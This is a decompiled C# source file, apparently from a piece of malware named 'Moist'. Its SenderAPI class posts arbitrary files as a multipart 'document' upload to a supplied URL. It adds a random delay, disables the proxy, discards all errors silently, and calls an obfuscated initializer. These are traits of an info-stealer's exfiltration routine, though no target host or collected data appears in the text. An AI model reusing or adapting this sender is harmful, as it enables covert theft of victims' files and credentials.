using System;
using System.Net;
using System.Threading;

namespace Moist
{
	// Token: 0x02000008 RID: 8
	public class SenderAPI
	{
		// Token: 0x06000019 RID: 25 RVA: 0x00005AD8 File Offset: 0x00003CD8
		public static void POST(byte[] file, string filename, string contentType, string url)
		{
			Thread.Sleep(new Random(Environment.TickCount).Next(500, 2000));
			try
			{
				ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
				WebClient webClient = new WebClient
				{
					Proxy = null
				};
				string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
				webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
				string @string = webClient.Encoding.GetString(file);
				string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
				{
					text,
					filename,
					contentType,
					@string
				});
				byte[] bytes = webClient.Encoding.GetBytes(s);
				webClient.UploadData(url, "POST", bytes);
			}
			catch
			{
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x0000446C File Offset: 0x0000266C
		public SenderAPI()
		{
			Class40.gcO0h7LzslQIW();
			base..ctor();
		}
	}
}
